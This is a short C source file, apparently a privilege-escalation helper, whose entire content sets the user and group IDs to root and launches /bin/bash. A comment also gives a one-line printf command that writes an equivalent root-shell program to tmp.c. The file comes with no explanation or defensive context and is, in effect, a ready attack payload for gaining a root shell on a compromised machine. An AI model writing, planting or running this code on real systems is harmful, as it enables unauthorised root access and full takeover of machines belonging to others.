#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

// printf 'int main(void){setresuid(0,0,0);system("/bin/sh");}'>tmp.c
int main(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
